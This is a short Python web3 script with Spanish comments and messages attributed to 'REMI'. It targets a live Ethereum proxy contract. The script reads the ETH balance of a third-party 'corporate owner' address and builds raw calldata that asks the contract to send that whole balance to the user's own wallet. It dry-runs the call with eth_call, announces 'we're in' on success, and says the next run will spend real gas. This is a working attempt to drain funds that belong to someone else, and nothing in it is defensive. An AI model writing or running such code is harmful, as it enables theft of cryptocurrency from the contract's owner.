from web3 import Web3

w3 = Web3(Web3.HTTPProvider('https://ethereum.publicnode.com'))
proxy = w3.to_checksum_address('0x3AC05161b76a35c1c28dC99Aa01BEd7B24cEA3bf')
tu_wallet = w3.to_checksum_address('0x96De980a766CCb10A19B6962587e2b61B650b372')

# Consultamos el saldo real del dueño corporativo para la simulación
dueño = w3.to_checksum_address('0x0125aeb5fF473De23ab72454B2bbC45613Ff3bd7')
saldo_wei = w3.eth.get_balance(dueño)

print(f"📡 REMI: Simulando extracción de {w3.from_wei(saldo_wei, 'ether')} ETH...")

# Intentamos con dos parámetros: Dirección + Cantidad
# Formato: Selector + Tu Wallet (32 bytes) + Saldo (32 bytes)
data_full = "0xf3ae2415" + tu_wallet[2:].lower().zfill(64) + hex(saldo_wei)[2:].zfill(64)

try:
    tx_eval = w3.eth.call({
        'to': proxy,
        'data': data_full,
        'from': tu_wallet
    })
    print("💎 ¡ESTAMOS DENTRO! El contrato acepta la orden de extracción total.")
    print("⚠️  AVISO: La próxima ejecución requerirá Gas real en tu wallet.")
except Exception as e:
    print(f"ℹ️ El contrato prefiere el formato simple. Usaremos la versión de un solo parámetro.")
